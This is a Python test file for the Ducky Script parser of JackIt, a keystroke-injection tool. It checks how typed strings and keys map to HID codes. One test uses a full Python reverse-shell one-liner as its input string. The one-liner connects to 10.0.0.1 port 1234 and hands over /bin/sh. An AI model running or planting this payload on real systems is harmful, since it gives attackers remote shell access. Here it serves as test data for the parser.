from __future__ import print_function, absolute_import
from jackit import duckyparser


def test_char_to_hid():
    '''basic test of char to hid '''
    dp = duckyparser.DuckyParser("test", 'us')
    assert dp.char_to_hid('a') == [4, 0]
    assert dp.char_to_hid('A') == [4, 2]
    assert dp.char_to_hid('UP') == [82, 0]


def test_parse_repeat():
    dp = duckyparser.DuckyParser("""
STRING Hello
REPEAT 5
""", 'us')
    assert dp.parse() == [{'char': 'H', 'hid': 11, 'sleep': 0, 'mod': 2},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'H', 'hid': 11, 'sleep': 0, 'mod': 2},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'H', 'hid': 11, 'sleep': 0, 'mod': 2},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'H', 'hid': 11, 'sleep': 0, 'mod': 2},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'H', 'hid': 11, 'sleep': 0, 'mod': 2},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0}]


def test_parse():
    dp = duckyparser.DuckyParser("test", 'us')
    assert dp.parse() == []

    dp = duckyparser.DuckyParser("GUI r\n", 'us')
    assert dp.parse() == [{'char': 'r', 'hid': 21, 'sleep': 0, 'mod': 8}]


def test_parse_arrowkeys():
    dp = duckyparser.DuckyParser('UP', 'us')
    assert dp.parse() == [{'char': 'UP', 'mod': 0, 'hid': 82, 'sleep': 0}]
    dp = duckyparser.DuckyParser('DOWN', 'us')
    assert dp.parse() == [{'char': 'DOWN', 'mod': 0, 'hid': 81, 'sleep': 0}]
    dp = duckyparser.DuckyParser('LEFT', 'us')
    assert dp.parse() == [{'char': 'LEFT', 'mod': 0, 'hid': 80, 'sleep': 0}]
    dp = duckyparser.DuckyParser('RIGHT', 'us')
    assert dp.parse() == [{'char': 'RIGHT', 'mod': 0, 'hid': 79, 'sleep': 0}]


def test_parse_advance():
    dp = duckyparser.DuckyParser("""
STRING python -c'import socket,os;s=socket.socket();s.connect(("10.0.0.1",1234));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl("/bin/sh","-i")'
ENTER
    """, 'us')
    assert dp.parse() == [{'char': 'p', 'hid': 19, 'sleep': 0, 'mod': 0},
                          {'char': 'y', 'hid': 28, 'sleep': 0, 'mod': 0},
                          {'char': 't', 'hid': 23, 'sleep': 0, 'mod': 0},
                          {'char': 'h', 'hid': 11, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'n', 'hid': 17, 'sleep': 0, 'mod': 0},
                          {'char': ' ', 'hid': 44, 'sleep': 0, 'mod': 0},
                          {'char': '-', 'hid': 45, 'sleep': 0, 'mod': 0},
                          {'char': 'c', 'hid': 6, 'sleep': 0, 'mod': 0},
                          {'char': "'", 'hid': 52, 'sleep': 0, 'mod': 0},
                          {'char': 'i', 'hid': 12, 'sleep': 0, 'mod': 0},
                          {'char': 'm', 'hid': 16, 'sleep': 0, 'mod': 0},
                          {'char': 'p', 'hid': 19, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'r', 'hid': 21, 'sleep': 0, 'mod': 0},
                          {'char': 't', 'hid': 23, 'sleep': 0, 'mod': 0},
                          {'char': ' ', 'hid': 44, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'c', 'hid': 6, 'sleep': 0, 'mod': 0},
                          {'char': 'k', 'hid': 14, 'sleep': 0, 'mod': 0},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 't', 'hid': 23, 'sleep': 0, 'mod': 0},
                          {'char': ',', 'hid': 54, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': '=', 'hid': 46, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'c', 'hid': 6, 'sleep': 0, 'mod': 0},
                          {'char': 'k', 'hid': 14, 'sleep': 0, 'mod': 0},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 't', 'hid': 23, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'c', 'hid': 6, 'sleep': 0, 'mod': 0},
                          {'char': 'k', 'hid': 14, 'sleep': 0, 'mod': 0},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 't', 'hid': 23, 'sleep': 0, 'mod': 0},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': 'c', 'hid': 6, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 'n', 'hid': 17, 'sleep': 0, 'mod': 0},
                          {'char': 'n', 'hid': 17, 'sleep': 0, 'mod': 0},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'c', 'hid': 6, 'sleep': 0, 'mod': 0},
                          {'char': 't', 'hid': 23, 'sleep': 0, 'mod': 0},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': '"', 'hid': 52, 'sleep': 0, 'mod': 2},
                          {'char': '1', 'hid': 30, 'sleep': 0, 'mod': 0},
                          {'char': '0', 'hid': 39, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': '0', 'hid': 39, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': '0', 'hid': 39, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': '1', 'hid': 30, 'sleep': 0, 'mod': 0},
                          {'char': '"', 'hid': 52, 'sleep': 0, 'mod': 2},
                          {'char': ',', 'hid': 54, 'sleep': 0, 'mod': 0},
                          {'char': '1', 'hid': 30, 'sleep': 0, 'mod': 0},
                          {'char': '2', 'hid': 31, 'sleep': 0, 'mod': 0},
                          {'char': '3', 'hid': 32, 'sleep': 0, 'mod': 0},
                          {'char': '4', 'hid': 33, 'sleep': 0, 'mod': 0},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 'h', 'hid': 11, 'sleep': 0, 'mod': 0},
                          {'char': '=', 'hid': 46, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': 'f', 'hid': 9, 'sleep': 0, 'mod': 0},
                          {'char': 'i', 'hid': 12, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'n', 'hid': 17, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 'd', 'hid': 7, 'sleep': 0, 'mod': 0},
                          {'char': '=', 'hid': 46, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': 'd', 'hid': 7, 'sleep': 0, 'mod': 0},
                          {'char': 'u', 'hid': 24, 'sleep': 0, 'mod': 0},
                          {'char': 'p', 'hid': 19, 'sleep': 0, 'mod': 0},
                          {'char': '2', 'hid': 31, 'sleep': 0, 'mod': 0},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 'd', 'hid': 7, 'sleep': 0, 'mod': 0},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': 'h', 'hid': 11, 'sleep': 0, 'mod': 0},
                          {'char': ',', 'hid': 54, 'sleep': 0, 'mod': 0},
                          {'char': '0', 'hid': 39, 'sleep': 0, 'mod': 0},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 'd', 'hid': 7, 'sleep': 0, 'mod': 0},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': 'h', 'hid': 11, 'sleep': 0, 'mod': 0},
                          {'char': ',', 'hid': 54, 'sleep': 0, 'mod': 0},
                          {'char': '1', 'hid': 30, 'sleep': 0, 'mod': 0},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 'd', 'hid': 7, 'sleep': 0, 'mod': 0},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': 'h', 'hid': 11, 'sleep': 0, 'mod': 0},
                          {'char': ',', 'hid': 54, 'sleep': 0, 'mod': 0},
                          {'char': '2', 'hid': 31, 'sleep': 0, 'mod': 0},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': ';', 'hid': 51, 'sleep': 0, 'mod': 0},
                          {'char': 'o', 'hid': 18, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': '.', 'hid': 55, 'sleep': 0, 'mod': 0},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'x', 'hid': 27, 'sleep': 0, 'mod': 0},
                          {'char': 'e', 'hid': 8, 'sleep': 0, 'mod': 0},
                          {'char': 'c', 'hid': 6, 'sleep': 0, 'mod': 0},
                          {'char': 'l', 'hid': 15, 'sleep': 0, 'mod': 0},
                          {'char': '(', 'hid': 38, 'sleep': 0, 'mod': 2},
                          {'char': '"', 'hid': 52, 'sleep': 0, 'mod': 2},
                          {'char': '/', 'hid': 56, 'sleep': 0, 'mod': 0},
                          {'char': 'b', 'hid': 5, 'sleep': 0, 'mod': 0},
                          {'char': 'i', 'hid': 12, 'sleep': 0, 'mod': 0},
                          {'char': 'n', 'hid': 17, 'sleep': 0, 'mod': 0},
                          {'char': '/', 'hid': 56, 'sleep': 0, 'mod': 0},
                          {'char': 's', 'hid': 22, 'sleep': 0, 'mod': 0},
                          {'char': 'h', 'hid': 11, 'sleep': 0, 'mod': 0},
                          {'char': '"', 'hid': 52, 'sleep': 0, 'mod': 2},
                          {'char': ',', 'hid': 54, 'sleep': 0, 'mod': 0},
                          {'char': '"', 'hid': 52, 'sleep': 0, 'mod': 2},
                          {'char': '-', 'hid': 45, 'sleep': 0, 'mod': 0},
                          {'char': 'i', 'hid': 12, 'sleep': 0, 'mod': 0},
                          {'char': '"', 'hid': 52, 'sleep': 0, 'mod': 2},
                          {'char': ')', 'hid': 39, 'sleep': 0, 'mod': 2},
                          {'char': "'", 'hid': 52, 'sleep': 0, 'mod': 0},
                          {'char': '\n', 'hid': 40, 'sleep': 0, 'mod': 0}]
